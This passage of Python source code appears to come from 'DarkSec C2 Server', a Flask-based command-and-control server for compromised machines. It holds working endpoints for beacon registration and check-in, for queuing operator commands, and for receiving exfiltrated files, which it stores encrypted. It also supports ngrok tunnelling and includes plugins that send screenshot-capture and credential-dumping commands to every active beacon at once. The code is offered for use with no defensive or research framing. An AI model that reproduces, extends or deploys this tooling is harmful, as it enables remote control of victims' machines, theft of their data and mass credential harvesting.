                    beacon_id = hashlib.md5(f"{hostname}{username}{time.time()}".encode()).hexdigest()
                
                self.db.register_beacon(beacon_id, hostname, username, os_type, ip_address, metadata, tags)
                
                # Execute auto-tasks
                auto_tasks = self.db.get_auto_tasks('on_register')
                for task in auto_tasks:
                    self.db.add_command(beacon_id, task[2], 'auto-task')
                
                # Audit log
                self.db.add_audit_log('system', 'beacon_register', beacon_id, f'{hostname}/{username}')
                
                self._log_request('beacon', 200)
                
                return jsonify({
                    'status': 'success',
                    'beacon_id': beacon_id,
                    'message': 'Beacon registered'
                })
            
            except ValueError as e:
                self._log_request('beacon', 400)
                return jsonify({'error': str(e)}), 400
            except Exception as e:
                logger.error(f"Beacon registration error: {e}", exc_info=True)
                self._log_request('beacon', 500)
                return jsonify({'error': 'Internal server error'}), 500
        
        # API: Beacon check-in
        @self.app.route('/api/beacon/checkin/<beacon_id>', methods=['POST'])
        def beacon_checkin(beacon_id):
            try:
                # Rate limit by beacon_id
                if not self._check_rate_limit(f"checkin_{beacon_id}"):
                    abort(429)
                
                beacon_id = InputValidator.validate_beacon_id(beacon_id)
                
                cursor = self.db.conn.cursor()
                cursor.execute('UPDATE beacons SET last_seen = ? WHERE id = ?', 
                             (datetime.now().isoformat(), beacon_id))
                self.db.conn.commit()
                
                commands = self.db.get_pending_commands(beacon_id)
                
                return jsonify({
                    'status': 'success',
                    'commands': [{'id': cmd[0], 'command': cmd[1]} for cmd in commands]
                })
            
            except ValueError as e:
                return jsonify({'error': str(e)}), 400
            except Exception as e:
                logger.error(f"Check-in error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500
        
        # API: Command result
        @self.app.route('/api/beacon/result/<int:command_id>', methods=['POST'])
        def command_result(command_id):
            try:
                data = request.get_json()
                if not data:
                    return jsonify({'error': 'Invalid JSON'}), 400
                
                result = data.get('result', '')
                
                self.db.update_command_result(command_id, result)
                
                return jsonify({'status': 'success'})
            
            except Exception as e:
                logger.error(f"Command result error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500
        
        # API: Data exfiltration with encryption
        @self.app.route('/api/beacon/exfil/<beacon_id>', methods=['POST'])
        def exfil_data(beacon_id):
            try:
                beacon_id = InputValidator.validate_beacon_id(beacon_id)
                
                if 'file' in request.files:
                    file = request.files['file']
                    filename = file.filename
                    data = file.read()
                    data_type = 'file'
                else:
                    data_json = request.get_json()
                    filename = data_json.get('filename', 'data.txt')
                    data = data_json.get('data', '').encode()
                    data_type = data_json.get('type', 'text')
                
                # Encrypt data
                encrypted_data = self.encryption.encrypt_data(data)
                
                exfil_id = self.db.store_exfil_data(beacon_id, data_type, filename, encrypted_data, encrypted=True)
                
                return jsonify({
                    'status': 'success',
                    'exfil_id': exfil_id
                })
            
            except ValueError as e:
                return jsonify({'error': str(e)}), 400
            except Exception as e:
                logger.error(f"Exfil error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500
        
        # API: List beacons with filtering
        @self.app.route('/api/beacons', methods=['GET'])
        def list_beacons():
            try:
                api_key = request.headers.get('X-API-Key')
                if not self._verify_permission(api_key, 'read'):
                    self._log_request('unauthorized', 401)
                    return jsonify({'error': 'Unauthorized'}), 401
                
                # Rate limit
                if not self._check_rate_limit(f"api_{api_key[:16]}"):
                    abort(429)
                
                user_info = self.db.verify_api_key(api_key)
                
                group = request.args.get('group')
                tags = request.args.get('tags')
                active_only = request.args.get('active') == 'true'
                
                beacons = self.db.get_beacons(active_only=active_only, group=group, tags=tags)
                
                self._log_request(user_info['username'], 200)
                
                return jsonify({
                    'beacons': [{
                        'id': b[0],
                        'hostname': b[1],
                        'username': b[2],
                        'os': b[3],
                        'ip': b[4],
                        'first_seen': b[5],
                        'last_seen': b[6],
                        'status': b[7],
                        'tags': b[9],
                        'group': b[10],
                        'health': b[11]
                    } for b in beacons]
                })
            
            except Exception as e:
                logger.error(f"List beacons error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500
        
        # API: Send command with operator tracking
        @self.app.route('/api/beacon/<beacon_id>/command', methods=['POST'])
        def send_command(beacon_id):
            try:
                api_key = request.headers.get('X-API-Key')
                user_info = self.db.verify_api_key(api_key)
                if not user_info or 'write' not in user_info['permissions']:
                    self._log_request('unauthorized', 401)
                    return jsonify({'error': 'Unauthorized'}), 401
                
                # Rate limit
                if not self._check_rate_limit(f"cmd_{user_info['username']}"):
                    abort(429)
                
                data = request.get_json()
                if not data:
                    return jsonify({'error': 'Invalid JSON'}), 400
                
                command = data.get('command')
                
                if not command:
                    return jsonify({'error': 'No command specified'}), 400
                
                command_id = self.db.add_command(beacon_id, command, user_info['username'])
                
                # Audit log
                self.db.add_audit_log(user_info['username'], 'send_command', beacon_id, command)
                
                self._log_request(user_info['username'], 200)
                
                return jsonify({
                    'status': 'success',
                    'command_id': command_id
                })
            
            except ValueError as e:
                return jsonify({'error': str(e)}), 400
            except Exception as e:
                logger.error(f"Send command error: {e}", exc_info=True)
                return jsonify({'error': 'Internal server error'}), 500
        
        # Additional routes would follow the same pattern with:
        # - Input validation
        # - Rate limiting
        # - Proper error handling
        # - Request logging
        # - Audit logging
        
        logger.info("All routes configured with security enhancements")
    
    def run(self):
        """Start C2 server"""
        protocol = 'https' if self.use_ssl else 'http'
        logger.info(f"Starting DarkSec C2 Server - Security Hardened Edition")
        logger.info(f"Listening on {self.host}:{self.port}")
        logger.info(f"Web Interface: {protocol}://{self.host}:{self.port}")
        logger.info(f"API Endpoint: {protocol}://{self.host}:{self.port}/api")
        logger.info(f"Features: SSL={self.use_ssl}, Ngrok={self.use_ngrok}")
        logger.info("Security Features: Rate Limiting, Input Validation, Audit Logging, CSRF Protection")
        logger.info("Press Ctrl+C to stop")
        
        try:
            if self.use_ssl:
                self.app.run(host=self.host, port=self.port, debug=False, threaded=True, ssl_context=self.ssl_context)
            else:
                self.app.run(host=self.host, port=self.port, debug=False, threaded=True)
        except KeyboardInterrupt:
            logger.info("Shutting down...")
            self.health_monitor.stop()
            if self.ngrok_manager:
                self.ngrok_manager.stop_tunnel()

# Example plugins
@register_plugin('mass_screenshot')
def mass_screenshot(server, data):
    """Take screenshots from all active beacons"""
    beacons = server.db.get_beacons(active_only=True)
    count = 0
    for beacon in beacons:
        beacon_id = beacon[0]
        server.db.add_command(beacon_id, 'SCREENSHOT:capture', 'plugin')
        count += 1
    return f'Screenshot command sent to {count} beacons'

@register_plugin('credential_harvest')
def credential_harvest(server, data):
    """Harvest credentials from all active beacons"""
    beacons = server.db.get_beacons(active_only=True)
    count = 0
    for beacon in beacons:
        beacon_id = beacon[0]
        server.db.add_command(beacon_id, 'CRED:dump_all', 'plugin')
        count += 1
    return f'Credential harvest command sent to {count} beacons'

def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description='DarkSec C2 Server - Security Hardened')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=8443, help='Port to listen on')
    parser.add_argument('--ssl', action='store_true', help='Enable SSL/TLS (HTTPS)')
    parser.add_argument('--ngrok', action='store_true', help='Enable ngrok tunnel')
    parser.add_argument('--ngrok-token', help='Ngrok auth token')
    parser.add_argument('--db', default='c2_data.db', help='Database file path')
    
    args = parser.parse_args()
    
    try:
        server = C2Server(
            host=args.host, 
            port=args.port,
            use_ssl=args.ssl,
            use_ngrok=args.ngrok,
            ngrok_token=args.ngrok_token
        )
        server.run()
    except KeyboardInterrupt:
        logger.info("Shutting down DarkSec C2 server...")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)

if __name__ == '__main__':
    main()
